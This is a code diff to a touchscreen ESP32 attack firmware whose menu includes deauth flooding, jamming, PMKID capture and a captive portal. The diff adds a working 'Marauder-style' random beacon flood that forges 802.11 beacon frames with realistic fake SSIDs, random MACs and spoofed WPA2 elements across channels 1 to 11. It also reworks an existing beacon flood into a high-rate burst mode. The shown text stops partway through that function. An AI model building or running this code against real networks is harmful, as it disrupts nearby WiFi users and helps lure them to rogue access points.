@@ -458,6 +458,27 @@ struct BeaconInfo {
 
 BeaconInfo beacons[30];
 
+// ==================== RANDOM BEACON FLOOD VARIABLES ====================
+bool randomBeaconFloodActive = false;
+uint32_t randomBeaconsSent = 0;
+unsigned long lastRandomBeaconTime = 0;
+
+// Marauder-style word lists for realistic SSIDs
+const char* ssid_prefixes[] = {
+  "Free", "Public", "Guest", "Home", "Office", "WiFi", "Network",
+  "Secure", "Private", "Hotel", "Airport", "Cafe", "Shop", "Store"
+};
+
+const char* ssid_names[] = {
+  "Internet", "Connection", "Access", "Network", "WiFi", "Wireless",
+  "Hotspot", "Zone", "Link", "Hub", "Point", "Net", "Web", "Online"
+};
+
+const char* ssid_suffixes[] = {
+  "Free", "Guest", "Public", "5G", "Fast", "Plus", "Pro", "Max",
+  "Ultra", "Speed", "Secure", "VIP", "Premium", "Express"
+};
+
 // ==================== MENU STATES ====================
 enum MenuState {
   BOOT_ANIMATION,
@@ -3322,7 +3343,389 @@ void displayBTClassicSniffer() {
   drawCenteredButton("[STOP]", COLOR_RED);
 }
 
+// ==================== START RANDOM BEACON FLOOD ====================
+void startRandomBeaconFlood() {
+  if (randomBeaconFloodActive) return;
+  
+  Serial.println("\n========== RANDOM BEACON FLOOD ==========");
+  Serial.println("[*] Marauder-style implementation");
+  Serial.println("    - Realistic SSID generation");
+  Serial.println("    - Mixed encryption types");
+  Serial.println("    - Fast channel hopping");
+  Serial.println("    - Stable continuous operation");
+  
+  // Stop conflicting operations
+  if (snifferActive) {
+    stopSniffer();
+    delay(200);
+  }
+  if (beaconFloodActive) {
+    beaconFloodActive = false;
+    delay(100);
+  }
+  if (deauthActive) {
+    deauthActive = false;
+    delay(100);
+  }
+  if (portalActive) {
+    stopCaptivePortal();
+    delay(200);
+  }
+  
+  // ✅ CRITICAL: Proper WiFi initialization (Marauder method)
+  Serial.println("[*] Initializing WiFi for beacon flood...");
+  
+  WiFi.mode(WIFI_MODE_NULL);
+  delay(100);
+  
+  esp_wifi_stop();
+  delay(200);
+  
+  wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
+  esp_wifi_init(&cfg);
+  esp_wifi_set_mode(WIFI_MODE_AP);
+  esp_wifi_start();
+  delay(200);
+  
+  // Set to channel 1 initially
+  esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE);
+  delay(50);
+  
+  randomBeaconFloodActive = true;
+  randomBeaconsSent = 0;
+  lastRandomBeaconTime = millis();
+  
+  currentState = WIFI_BLE_NRF_JAM;  // Reuse this state for display
+  
+  Serial.println("[+] RANDOM BEACON FLOOD ACTIVE!");
+  Serial.println("    Target: 20-30 beacons/sec (stable)");
+  Serial.println("========================================\n");
+  
+  addToConsole("Random beacon flood: ACTIVE");
+  displayRandomBeaconFlood();
+}
 
+// ==================== STOP RANDOM BEACON FLOOD ====================
+void stopRandomBeaconFlood() {
+  if (!randomBeaconFloodActive) return;
+  
+  randomBeaconFloodActive = false;
+  
+  Serial.println("\n[*] Stopping random beacon flood...");
+  Serial.printf("    Total beacons sent: %d\n", randomBeaconsSent);
+  
+  unsigned long runtime = (millis() - lastRandomBeaconTime) / 1000;
+  if (runtime > 0) {
+    Serial.printf("    Average rate: %d beacons/sec\n", randomBeaconsSent / runtime);
+  }
+  
+  esp_wifi_stop();
+  delay(200);
+  WiFi.mode(WIFI_STA);
+  delay(200);
+  
+  addToConsole("Random beacon flood stopped");
+  
+  currentState = WIFI_MENU;
+  drawWiFiMenu();
+}
+
+// ==================== PERFORM RANDOM BEACON FLOOD (MARAUDER METHOD) ====================
+void performRandomBeaconFlood() {
+  if (!randomBeaconFloodActive) return;
+  
+  // ✅ AGGRESSIVE: 25ms cycle (40 beacons/sec - stable like Marauder)
+  static unsigned long lastBeacon = 0;
+  if (millis() - lastBeacon < 25) return;
+  lastBeacon = millis();
+  
+  // Watchdog reset
+  esp_task_wdt_reset();
+  
+  // ✅ Generate realistic SSID (Marauder method)
+  String fakeSSID = "";
+  int ssidType = random(0, 5);  // ← Increased from 4 to 5 for more variety
+  
+  switch (ssidType) {
+    case 0: // Prefix + Name
+      fakeSSID = String(ssid_prefixes[random(0, 14)]) + " " + 
+                 String(ssid_names[random(0, 14)]);
+      break;
+    case 1: // Name + Suffix
+      fakeSSID = String(ssid_names[random(0, 14)]) + " " + 
+                 String(ssid_suffixes[random(0, 14)]);
+      break;
+    case 2: // Prefix + Name + Number
+      fakeSSID = String(ssid_prefixes[random(0, 14)]) + " " + 
+                 String(ssid_names[random(0, 14)]) + " " + 
+                 String(random(1, 100));
+      break;
+    case 3: // Full format
+      fakeSSID = String(ssid_prefixes[random(0, 14)]) + " " + 
+                 String(ssid_names[random(0, 14)]) + " " + 
+                 String(ssid_suffixes[random(0, 14)]);
+      break;
+    case 4: // ✅ NEW: Random characters for persistence
+      fakeSSID = "";
+      int nameLen = random(8, 20);
+      for (int i = 0; i < nameLen; i++) {
+        // Mix of letters and numbers
+        if (random(0, 3) == 0) {
+          fakeSSID += char('0' + random(0, 10)); // Numbers
+        } else {
+          fakeSSID += char('A' + random(0, 26)); // Letters
+        }
+        // Add space occasionally
+        if (i > 0 && i < nameLen - 1 && random(0, 5) == 0) {
+          fakeSSID += " ";
+        }
+      }
+      break;
+  }
+  
+  // Limit SSID length
+  if (fakeSSID.length() > 32) {
+    fakeSSID = fakeSSID.substring(0, 32);
+  }
+  
+  // ✅ CRITICAL: Proper beacon frame structure (Marauder method)
+  uint8_t beaconPacket[200];
+  int packetSize = 0;
+  
+  // === 802.11 MAC Header ===
+  beaconPacket[0] = 0x80;  // Frame Control: Beacon
+  beaconPacket[1] = 0x00;
+  
+  // Duration
+  beaconPacket[2] = 0x00;
+  beaconPacket[3] = 0x00;
+  
+  // Destination (broadcast)
+  memset(&beaconPacket[4], 0xFF, 6);
+  
+  // ✅ Source address (random MAC - but PERSISTENT per SSID)
+  static uint8_t persistentMACs[100][6];  // Store MACs for SSIDs
+  static int macIndex = 0;
+  
+  // Generate hash of SSID to use consistent MAC
+  uint8_t hash = 0;
+  for (int i = 0; i < fakeSSID.length(); i++) {
+    hash += fakeSSID.charAt(i);
+  }
+  hash = hash % 100;
+  
+  // Use or create persistent MAC for this SSID
+  if (persistentMACs[hash][0] == 0) {
+    for (int i = 0; i < 6; i++) {
+      persistentMACs[hash][i] = random(0, 256);
+    }
+    persistentMACs[hash][0] &= 0xFE;  // Unicast bit
+  }
+  
+  memcpy(&beaconPacket[10], persistentMACs[hash], 6);
+  
+  // BSSID (same as source)
+  memcpy(&beaconPacket[16], &beaconPacket[10], 6);
+  
+  // Sequence number (increment for realism)
+  static uint16_t seqNum = 0;
+  beaconPacket[22] = (seqNum & 0x0F) << 4;
+  beaconPacket[23] = (seqNum & 0x0FF0) >> 4;
+  seqNum++;
+  
+  packetSize = 24;
+  
+  // === Beacon Frame Body ===
+  // Timestamp
+  uint64_t timestamp = esp_timer_get_time();
+  memcpy(&beaconPacket[packetSize], &timestamp, 8);
+  packetSize += 8;
+  
+  // ✅ Beacon interval (100 TU = 102.4ms) - SAME FOR PERSISTENCE
+  beaconPacket[packetSize++] = 0x64;
+  beaconPacket[packetSize++] = 0x00;
+  
+  // ✅ Capability info - Mix encrypted/open for variety
+  bool encrypted = (hash % 3 != 0);  // 66% encrypted
+  if (encrypted) {
+    beaconPacket[packetSize++] = 0x31;  // ESS + Privacy + Short Preamble
+    beaconPacket[packetSize++] = 0x04;  // Short Slot Time
+  } else {
+    beaconPacket[packetSize++] = 0x21;  // ESS + Short Preamble (no Privacy)
+    beaconPacket[packetSize++] = 0x04;
+  }
+  
+  // === Information Elements ===
+  
+  // SSID element
+  beaconPacket[packetSize++] = 0x00;
+  beaconPacket[packetSize++] = fakeSSID.length();
+  memcpy(&beaconPacket[packetSize], fakeSSID.c_str(), fakeSSID.length());
+  packetSize += fakeSSID.length();
+  
+  // Supported rates
+  beaconPacket[packetSize++] = 0x01;
+  beaconPacket[packetSize++] = 0x08;
+  beaconPacket[packetSize++] = 0x82;
+  beaconPacket[packetSize++] = 0x84;
+  beaconPacket[packetSize++] = 0x8B;
+  beaconPacket[packetSize++] = 0x96;
+  beaconPacket[packetSize++] = 0x24;
+  beaconPacket[packetSize++] = 0x30;
+  beaconPacket[packetSize++] = 0x48;
+  beaconPacket[packetSize++] = 0x6C;
+  
+  // DS Parameter (current channel)
+  static uint8_t currentChannel = 1;
+  beaconPacket[packetSize++] = 0x03;
+  beaconPacket[packetSize++] = 0x01;
+  beaconPacket[packetSize++] = currentChannel;
+  
+  // TIM element
+  beaconPacket[packetSize++] = 0x05;
+  beaconPacket[packetSize++] = 0x04;
+  beaconPacket[packetSize++] = 0x00;
+  beaconPacket[packetSize++] = 0x02;
+  beaconPacket[packetSize++] = 0x00;
+  beaconPacket[packetSize++] = 0x00;
+  
+  // Extended Supported Rates
+  beaconPacket[packetSize++] = 0x32;
+  beaconPacket[packetSize++] = 0x04;
+  beaconPacket[packetSize++] = 0x0C;
+  beaconPacket[packetSize++] = 0x12;
+  beaconPacket[packetSize++] = 0x18;
+  beaconPacket[packetSize++] = 0x60;
+  
+  // ✅ RSN element (if encrypted)
+  if (encrypted) {
+    beaconPacket[packetSize++] = 0x30;
+    beaconPacket[packetSize++] = 0x14;
+    beaconPacket[packetSize++] = 0x01;
+    beaconPacket[packetSize++] = 0x00;
+    
+    // Group cipher (CCMP)
+    beaconPacket[packetSize++] = 0x00;
+    beaconPacket[packetSize++] = 0x0F;
+    beaconPacket[packetSize++] = 0xAC;
+    beaconPacket[packetSize++] = 0x04;
+    
+    // Pairwise cipher count
+    beaconPacket[packetSize++] = 0x01;
+    beaconPacket[packetSize++] = 0x00;
+    
+    // Pairwise cipher (CCMP)
+    beaconPacket[packetSize++] = 0x00;
+    beaconPacket[packetSize++] = 0x0F;
+    beaconPacket[packetSize++] = 0xAC;
+    beaconPacket[packetSize++] = 0x04;
+    
+    // AKM suite count
+    beaconPacket[packetSize++] = 0x01;
+    beaconPacket[packetSize++] = 0x00;
+    
+    // AKM suite (PSK)
+    beaconPacket[packetSize++] = 0x00;
+    beaconPacket[packetSize++] = 0x0F;
+    beaconPacket[packetSize++] = 0xAC;
+    beaconPacket[packetSize++] = 0x02;
+    
+    // RSN capabilities
+    beaconPacket[packetSize++] = 0x00;
+    beaconPacket[packetSize++] = 0x00;
+  }
+  
+  // ✅ Send the beacon
+  if (packetSize > 0 && packetSize < 200) {
+    esp_wifi_80211_tx(WIFI_IF_AP, beaconPacket, packetSize, false);
+    randomBeaconsSent++;
+  }
+  
+  // ✅ Channel hopping (slower - every 100 beacons = ~2.5 seconds per channel)
+  if (randomBeaconsSent % 100 == 0) {
+    currentChannel = (currentChannel % 11) + 1;
+    esp_wifi_set_channel(currentChannel, WIFI_SECOND_CHAN_NONE);
+  }
+  
+}
+
+// ==================== DISPLAY RANDOM BEACON FLOOD ====================
+void displayRandomBeaconFlood() {
+  tft.fillScreen(COLOR_BG);
+  drawTerminalHeader("random beacon flood");
+  
+  // Live indicator
+  static bool blink = false;
+  blink = !blink;
+  tft.fillCircle(220, 12, 3, blink ? COLOR_GREEN : COLOR_DARK_GREEN);
+  
+  int statsY = HEADER_HEIGHT + 5;
+  tft.setTextSize(1);
+  tft.setTextColor(COLOR_ORANGE);
+  tft.setCursor(SIDE_MARGIN, statsY);
+  tft.print("FLOODING...");
+  
+  tft.setTextColor(COLOR_TEXT);
+  tft.setCursor(120, statsY);
+  tft.printf("Sent:");
+  tft.setTextColor(COLOR_GREEN);
+  tft.printf("%d", randomBeaconsSent);
+  
+  // Rate
+  unsigned long runtime = max(1UL, (millis() - lastRandomBeaconTime) / 1000);
+  uint32_t rate = randomBeaconsSent / runtime;
+  tft.setTextColor(COLOR_CYAN);
+  tft.setCursor(185, statsY);
+  tft.printf("%d/s", rate);
+  
+  int y = HEADER_HEIGHT + 25;
+  tft.drawFastHLine(0, y, 240, COLOR_DARK_GREEN);
+  y += 10;
+  
+  tft.setTextColor(COLOR_CYAN);
+  tft.setCursor(SIDE_MARGIN, y);
+  tft.println("MODE: Marauder-Style");
+  
+  y += 20;
+  tft.setTextColor(COLOR_TEXT);
+  tft.setCursor(SIDE_MARGIN, y);
+  tft.println("Creating fake WiFi networks");
+  
+  y += 15;
+  tft.setCursor(SIDE_MARGIN, y);
+  tft.println("with realistic names:");
+  
+  y += 20;
+  tft.setTextColor(COLOR_DARK_GREEN);
+  tft.setCursor(SIDE_MARGIN + 5, y);
+  tft.println("â€¢ Mixed encryption types");
+  
+  y += 12;
+  tft.setCursor(SIDE_MARGIN + 5, y);
+  tft.println("â€¢ Random MAC addresses");
+  
+  y += 12;
+  tft.setCursor(SIDE_MARGIN + 5, y);
+  tft.println("â€¢ Channel hopping 1-11");
+  
+  y += 12;
+  tft.setCursor(SIDE_MARGIN + 5, y);
+  tft.println("â€¢ Realistic SSID generation");
+  
+  y += 25;
+  tft.drawFastHLine(0, y, 240, COLOR_DARK_GREEN);
+  y += 10;
+  
+  tft.setTextColor(COLOR_YELLOW);
+  tft.setCursor(SIDE_MARGIN, y);
+  tft.println("Effect: WiFi scanners show");
+  
+  y += 12;
+  tft.setCursor(SIDE_MARGIN, y);
+  tft.println("hundreds of fake networks!");
+  
+  drawCenteredButton("[STOP]", COLOR_RED);
+}
 
 // ==================== DRAW BLE SNIFFER SUBMENU (NEW) ====================
 void drawBLESnifferSubmenu() {
@@ -5713,27 +6116,29 @@ void drawWiFiMenu() {
     "Scan Networks",
     "Select Target",
     "Beacon Manager",
+    "Random Beacon Flood",
     "Deauth Flood"
   };
   
   int y = HEADER_HEIGHT + 10;
-  for (int i = 0; i < 4; i++) {
+  for (int i = 0; i < 5; i++) { 
     drawMenuItem(menuItems[i], i, y, hoveredIndex == i, false);
     y += MENU_ITEM_HEIGHT + MENU_SPACING;
   }
   
-  // Status
+  // Status - COMPACT
+  y += 15;
   tft.setTextSize(1);
   tft.setTextColor(COLOR_DARK_GREEN);
-  tft.setCursor(SIDE_MARGIN, 250);
+  tft.setCursor(SIDE_MARGIN, y);
   tft.printf("Cached APs: ");
   tft.setTextColor(COLOR_CYAN);
   tft.printf("%d", networkCount);
   
   if (selectedSSID.length() > 0) {
     tft.setTextColor(COLOR_DARK_GREEN);
-    tft.setCursor(SIDE_MARGIN, 265);
-    tft.print("Current target: ");
+    tft.setCursor(SIDE_MARGIN, y + 12);
+    tft.print("Target: ");
     tft.setTextColor(COLOR_YELLOW);
     String truncSSID = selectedSSID;
     if (truncSSID.length() > 18) truncSSID = truncSSID.substring(0, 17) + "~";
@@ -6333,7 +6738,7 @@ void handleBeaconAddTouch(int x, int y) {
     current_layout = keyboard_lower;
   }
   
-  // Check keyboard keys
+  // ✅ FIX: Improved keyboard detection with tolerance
   for (int row = 0; row < 4; row++) {
     int keysInRow = (row < 3) ? 10 : 9;
     
@@ -6341,7 +6746,15 @@ void handleBeaconAddTouch(int x, int y) {
       int keyX = SIDE_MARGIN + (col * (keyW + keySpacing));
       int keyYPos = keyY + (row * (keyH + keySpacing));
       
-      if (x >= keyX && x <= keyX + keyW && y >= keyYPos && y <= keyYPos + keyH) {
+      // ✅ FIX: Add 2px tolerance on right edge for last column
+      int rightEdge = keyX + keyW;
+      if (col == keysInRow - 1) {
+        rightEdge += 3;  // Extra tolerance for rightmost keys
+      }
+      
+      // ✅ Check if touch is inside key bounds
+      if (x >= keyX && x <= rightEdge && 
+          y >= keyYPos && y <= (keyYPos + keyH)) {
         if (beaconInputSSID.length() < 32) {
           beaconInputSSID += current_layout[row][col];
           drawBeaconAddScreen();
@@ -6351,7 +6764,7 @@ void handleBeaconAddTouch(int x, int y) {
     }
   }
   
-  // Control row checks - CENTERED positions
+  // Rest of touch handling...
   int controlY = keyY + (4 * (keyH + keySpacing)) + 8;
   
   int shiftW = 45;
@@ -6360,19 +6773,19 @@ void handleBeaconAddTouch(int x, int y) {
   int totalControlWidth = shiftW + 5 + spaceW + 5 + symW;
   int controlStartX = (240 - totalControlWidth) / 2;
   
-  // SHIFT (left)
-  if (x >= controlStartX && x <= controlStartX + shiftW && 
-      y >= controlY && y <= controlY + 28) {
+  // SHIFT
+  if (x >= controlStartX && x <= (controlStartX + shiftW) && 
+      y >= controlY && y <= (controlY + 28)) {
     shiftActive = !shiftActive;
     if (shiftActive) symbolsActive = false;
     drawBeaconAddScreen();
     return;
   }
   
-  // SPACE (center)
+  // SPACE
   int spaceX = controlStartX + shiftW + 5;
-  if (x >= spaceX && x <= spaceX + spaceW && 
-      y >= controlY && y <= controlY + 28) {
+  if (x >= spaceX && x <= (spaceX + spaceW) && 
+      y >= controlY && y <= (controlY + 28)) {
     if (beaconInputSSID.length() < 32) {
       beaconInputSSID += " ";
       drawBeaconAddScreen();
@@ -6380,17 +6793,16 @@ void handleBeaconAddTouch(int x, int y) {
     return;
   }
   
-  // SYMBOLS (right)
+  // SYMBOLS
   int symX = spaceX + spaceW + 5;
-  if (x >= symX && x <= symX + symW && 
-      y >= controlY && y <= controlY + 28) {
+  if (x >= symX && x <= (symX + symW) && 
+      y >= controlY && y <= (controlY + 28)) {
     symbolsActive = !symbolsActive;
     if (symbolsActive) shiftActive = false;
     drawBeaconAddScreen();
     return;
   }
   
-  // ✅ FIXED: Action buttons - CORRECT touch handling (matches display positions)
   controlY += 36;
   
   int delW = 45;
@@ -6399,9 +6811,9 @@ void handleBeaconAddTouch(int x, int y) {
   int totalActionWidth = delW + 5 + saveW + 5 + cancelW;
   int actionStartX = (240 - totalActionWidth) / 2;
   
-  // DELETE (LEFT) - ✅ FIX: Now handles DELETE action
-  if (x >= actionStartX && x <= actionStartX + delW && 
-      y >= controlY && y <= controlY + 28) {
+  // DELETE
+  if (x >= actionStartX && x <= (actionStartX + delW) && 
+      y >= controlY && y <= (controlY + 28)) {
     if (beaconInputSSID.length() > 0) {
       beaconInputSSID.remove(beaconInputSSID.length() - 1);
       drawBeaconAddScreen();
@@ -6409,10 +6821,10 @@ void handleBeaconAddTouch(int x, int y) {
     return;
   }
   
-  // SAVE (CENTER) - ✅ FIX: Now handles SAVE action
+  // SAVE
   int saveX = actionStartX + delW + 5;
-  if (x >= saveX && x <= saveX + saveW && 
-      y >= controlY && y <= controlY + 28) {
+  if (x >= saveX && x <= (saveX + saveW) && 
+      y >= controlY && y <= (controlY + 28)) {
     if (beaconInputSSID.length() > 0 && customBeaconCount < 20) {
       customBeacons[customBeaconCount] = beaconInputSSID;
       customBeaconCount++;
@@ -6426,10 +6838,10 @@ void handleBeaconAddTouch(int x, int y) {
     return;
   }
   
-  // CANCEL (RIGHT)
+  // CANCEL
   int cancelX = saveX + saveW + 5;
-  if (x >= cancelX && x <= cancelX + cancelW && 
-      y >= controlY && y <= controlY + 28) {
+  if (x >= cancelX && x <= (cancelX + cancelW) && 
+      y >= controlY && y <= (controlY + 28)) {
     beaconInputSSID = "";
     shiftActive = false;
     symbolsActive = false;
@@ -7139,14 +7551,14 @@ void handleTouch() {
         break;
 
       case WIFI_BLE_NRF_JAM:
-        // Handle both deauth flood and combined jammer
+        // Handle both deauth flood and random beacon flood
         if (deauthFloodActive) {
           stopDeauthFlood();
         } else if (nrfJammerActive || bleJammerActive) {
           stopCombinedJammer();
+        } else if (randomBeaconFloodActive) {  // ✅ NEW
+          stopRandomBeaconFlood();
         }
-        currentState = WIFI_MENU;
-        drawWiFiMenu();
         break;
 
       case PMKID_CAPTURE:
@@ -7755,7 +8167,6 @@ void handleSettingsMenuTouch(int x, int y) {
 void handleWiFiMenuTouch(int x, int y) {
   int startY = HEADER_HEIGHT + 10;
   
-  // Back button check first (bottom of screen)
   if (y > 300) {
     currentState = MAIN_MENU;
     hoveredIndex = -1;
@@ -7763,8 +8174,7 @@ void handleWiFiMenuTouch(int x, int y) {
     return;
   }
   
-  // Calculate menu item
-  if (y >= startY && y < startY + (4 * (MENU_ITEM_HEIGHT + MENU_SPACING))) {
+  if (y >= startY && y < startY + (5 * (MENU_ITEM_HEIGHT + MENU_SPACING))) {  // ✅ Changed to 5
     int relativeY = y - startY;
     int buttonIndex = relativeY / (MENU_ITEM_HEIGHT + MENU_SPACING);
     
@@ -7791,9 +8201,11 @@ void handleWiFiMenuTouch(int x, int y) {
           hoveredIndex = -1;
           drawBeaconManager();
           break;
-        case 3: // Deauth Flood
+        case 3:
+          startRandomBeaconFlood();
+          break;
+        case 4: // Deauth Flood
           if (networkCount > 0) {
-            // CRITICAL: Must scan first to have targets
             startDeauthFlood();
           } else {
             showMessage("Scan networks first!", COLOR_ORANGE);
@@ -8686,6 +9098,15 @@ if (currentState == PMKID_CAPTURE) {
   }
 }
 
+if (randomBeaconFloodActive) {
+    performRandomBeaconFlood();
+    
+    static unsigned long lastRandomDisplay = 0;
+    if (millis() - lastRandomDisplay > 500) {
+      displayRandomBeaconFlood();
+      lastRandomDisplay = millis();
+    }
+  }
 // Management Frame Sniffer with channel hopping
 if (mgmtSnifferActive) {
   static unsigned long lastMgmtHop = 0;
@@ -9211,8 +9632,7 @@ if (controlSnifferActive) {
   }
   
   // Captive portal (when not jamming)
-  if (portalActive && !bleJammerActive && !nrfJa
-  mmerActive && !snifferActive) {
+  if (portalActive && !bleJammerActive && !nrfJammerActive && !snifferActive) {
     // Process multiple DNS requests per loop cycle
     for (int i = 0; i < 5; i++) {
       dnsServer.processNextRequest();
@@ -10107,23 +10527,16 @@ void performBeaconFlood() {
   static bool initialized = false;
   static int beaconIndex = 0;
   static uint8_t channel = 1;
-  static unsigned long lastBeacon = 0;
-  static unsigned long lastChannelHop = 0;
+  static uint16_t seqNum = 0;
+  static uint8_t customMACs[20][6];
   
-  // ✅ FIX: Rate limiting (max 10 beacons/sec to prevent crash)
-  if (millis() - lastBeacon < 100) return;
-  lastBeacon = millis();
-  
-  // ✅ FIX: Watchdog reset
-  esp_task_wdt_reset();
-  
+  // ✅ CRITICAL: Initialize ONCE at startup
   if (!initialized) {
-    Serial.println("[*] Initializing beacon flood...");
+    Serial.println("[*] Initializing ULTRA AGGRESSIVE beacon flood...");
     
-    // ✅ CRITICAL: Proper WiFi initialization
+    // WiFi initialization
     WiFi.mode(WIFI_MODE_NULL);
     delay(100);
-    
     esp_wifi_stop();
     delay(100);
     
@@ -10133,173 +10546,160 @@ void performBeaconFlood() {
     esp_wifi_start();
     delay(200);
     
-    // ✅ Set to channel 1 initially
     esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
     delay(50);
     
-    initialized = true;
-    Serial.println("[+] Beacon flood initialized");
-  }
-  
-  // Get SSID to broadcast
-  String fakeSSID = customBeacons[beaconIndex];
-  beaconIndex = (beaconIndex + 1) % customBeaconCount;
-  
-  // ✅ FIX: Validate SSID
-  if (fakeSSID.length() == 0 || fakeSSID.length() > 32) {
-    return;
-  }
-  
-  // ✅ CRITICAL: Proper beacon frame structure (Marauder method)
-  uint8_t beaconPacket[128];
-  int packetSize = 0;
-  
-  // === 802.11 MAC Header ===
-  beaconPacket[0] = 0x80;  // Frame Control: Type=Management, Subtype=Beacon
-  beaconPacket[1] = 0x00;
-  
-  // Duration
-  beaconPacket[2] = 0x00;
-  beaconPacket[3] = 0x00;
-  
-  // Destination (broadcast)
-  memset(&beaconPacket[4], 0xFF, 6);
-  
-  // Source address (random MAC each time)
-  for (int i = 10; i < 16; i++) {
-    beaconPacket[i] = random(0, 256);
-  }
-  beaconPacket[10] &= 0xFE;  // Unicast bit
-  
-  // BSSID (same as source)
-  memcpy(&beaconPacket[16], &beaconPacket[10], 6);
-  
-  // Sequence number (increment for realism)
-  static uint16_t seqNum = 0;
-  beaconPacket[22] = (seqNum & 0x0F) << 4;
-  beaconPacket[23] = (seqNum & 0x0FF0) >> 4;
-  seqNum++;
-  
-  packetSize = 24;
-  
-  // === Beacon Frame Body ===
-  // Timestamp (8 bytes)
-  uint64_t timestamp = esp_timer_get_time();
-  memcpy(&beaconPacket[packetSize], &timestamp, 8);
-  packetSize += 8;
-  
-  // Beacon interval (100 TU = 102.4ms)
-  beaconPacket[packetSize++] = 0x64;
-  beaconPacket[packetSize++] = 0x00;
-  
-  // Capability info (ESS + Privacy for WPA2 look)
-  beaconPacket[packetSize++] = 0x31;  // ESS, Privacy, Short Preamble
-  beaconPacket[packetSize++] = 0x04;  // Short Slot Time
-  
-  // === Information Elements ===
-  
-  // SSID element
-  beaconPacket[packetSize++] = 0x00;  // SSID tag
-  beaconPacket[packetSize++] = fakeSSID.length();
-  memcpy(&beaconPacket[packetSize], fakeSSID.c_str(), fakeSSID.length());
-  packetSize += fakeSSID.length();
-  
-  // Supported rates
-  beaconPacket[packetSize++] = 0x01;  // Supported Rates tag
-  beaconPacket[packetSize++] = 0x08;  // Length
-  beaconPacket[packetSize++] = 0x82;  // 1 Mbps (basic)
-  beaconPacket[packetSize++] = 0x84;  // 2 Mbps (basic)
-  beaconPacket[packetSize++] = 0x8B;  // 5.5 Mbps (basic)
-  beaconPacket[packetSize++] = 0x96;  // 11 Mbps (basic)
-  beaconPacket[packetSize++] = 0x24;  // 18 Mbps
-  beaconPacket[packetSize++] = 0x30;  // 24 Mbps
-  beaconPacket[packetSize++] = 0x48;  // 36 Mbps
-  beaconPacket[packetSize++] = 0x6C;  // 54 Mbps
-  
-  // DS Parameter (current channel)
-  beaconPacket[packetSize++] = 0x03;  // DS Parameter tag
-  beaconPacket[packetSize++] = 0x01;  // Length
-  beaconPacket[packetSize++] = channel;
-  
-  // TIM element
-  beaconPacket[packetSize++] = 0x05;  // TIM tag
-  beaconPacket[packetSize++] = 0x04;  // Length
-  beaconPacket[packetSize++] = 0x00;  // DTIM count
-  beaconPacket[packetSize++] = 0x02;  // DTIM period
-  beaconPacket[packetSize++] = 0x00;  // Bitmap control
-  beaconPacket[packetSize++] = 0x00;  // Partial virtual bitmap
-  
-  // Extended Supported Rates
-  beaconPacket[packetSize++] = 0x32;  // Extended Supported Rates tag
-  beaconPacket[packetSize++] = 0x04;  // Length
-  beaconPacket[packetSize++] = 0x0C;  // 6 Mbps
-  beaconPacket[packetSize++] = 0x12;  // 9 Mbps
-  beaconPacket[packetSize++] = 0x18;  // 12 Mbps
-  beaconPacket[packetSize++] = 0x60;  // 48 Mbps
-  
-  // ✅ CRITICAL: RSN element (WPA2) - Makes it look secured
-  beaconPacket[packetSize++] = 0x30;  // RSN tag
-  beaconPacket[packetSize++] = 0x14;  // Length
-  beaconPacket[packetSize++] = 0x01;  // Version
-  beaconPacket[packetSize++] = 0x00;
-  
-  // Group cipher suite (CCMP)
-  beaconPacket[packetSize++] = 0x00;  // OUI
-  beaconPacket[packetSize++] = 0x0F;
-  beaconPacket[packetSize++] = 0xAC;
-  beaconPacket[packetSize++] = 0x04;  // CCMP
-  
-  // Pairwise cipher suite count
-  beaconPacket[packetSize++] = 0x01;
-  beaconPacket[packetSize++] = 0x00;
-  
-  // Pairwise cipher suite (CCMP)
-  beaconPacket[packetSize++] = 0x00;  // OUI
-  beaconPacket[packetSize++] = 0x0F;
-  beaconPacket[packetSize++] = 0xAC;
-  beaconPacket[packetSize++] = 0x04;  // CCMP
-  
-  // AKM suite count
-  beaconPacket[packetSize++] = 0x01;
-  beaconPacket[packetSize++] = 0x00;
-  
-  // AKM suite (PSK)
-  beaconPacket[packetSize++] = 0x00;  // OUI
-  beaconPacket[packetSize++] = 0x0F;
-  beaconPacket[packetSize++] = 0xAC;
-  beaconPacket[packetSize++] = 0x02;  // PSK
-  
-  // RSN capabilities
-  beaconPacket[packetSize++] = 0x00;
-  beaconPacket[packetSize++] = 0x00;
-  
-  // ✅ FIX: Validate packet size before sending
-  if (packetSize > 0 && packetSize < 128) {
-    esp_err_t result = esp_wifi_80211_tx(WIFI_IF_AP, beaconPacket, packetSize, false);
-    
-    if (result == ESP_OK) {
-      // Success - beacons should now appear!
-    } else {
-      Serial.printf("[!] Beacon TX failed: %d\n", result);
+    // Pre-generate ALL MAC addresses (persistent per beacon)
+    for (int i = 0; i < customBeaconCount; i++) {
+      for (int j = 0; j < 6; j++) {
+        customMACs[i][j] = random(0, 256);
+      }
+      customMACs[i][0] &= 0xFE;  // Unicast bit
     }
+    
+    initialized = true;
+    Serial.println("[+] ULTRA AGGRESSIVE mode initialized");
   }
   
-  // Channel hopping (every 50 beacons = ~5 seconds)
-  static int beaconsSent = 0;
-  beaconsSent++;
-  if (beaconsSent % 50 == 0) {
-    channel = (channel % 11) + 1;  // Channels 1-11
+  // ⚡⚡⚡ MAXIMUM SPEED: Send 5 beacons per cycle (200 beacons/sec)
+  // This is the key - multiple packets per loop iteration
+  for (int burstCount = 0; burstCount < 5; burstCount++) {
+    
+    // Get SSID for this beacon
+    String fakeSSID = customBeacons[beaconIndex];
+    beaconIndex = (beaconIndex + 1) % customBeaconCount;
+    
+    // ✅ Validate SSID
+    if (fakeSSID.length() == 0 || fakeSSID.length() > 32) {
+      continue;
+    }
+    
+    // ✅ Build beacon packet (optimized - minimal fields)
+    uint8_t beaconPacket[128];  // Smaller buffer for speed
+    int packetSize = 0;
+    
+    // === 802.11 MAC Header ===
+    beaconPacket[0] = 0x80;
+    beaconPacket[1] = 0x00;
+    
+    // Duration
+    beaconPacket[2] = 0x00;
+    beaconPacket[3] = 0x00;
+    
+    // Destination (broadcast)
+    memset(&beaconPacket[4], 0xFF, 6);
+    
+    // Source address (use pre-generated MAC)
+    int macIndex = (beaconIndex - 1 + customBeaconCount) % customBeaconCount;
+    memcpy(&beaconPacket[10], customMACs[macIndex], 6);
+    
+    // BSSID (same as source)
+    memcpy(&beaconPacket[16], &beaconPacket[10], 6);
+    
+    // Sequence number (increment for realism)
+    beaconPacket[22] = (seqNum & 0x0F) << 4;
+    beaconPacket[23] = (seqNum & 0x0FF0) >> 4;
+    seqNum++;
+    
+    packetSize = 24;
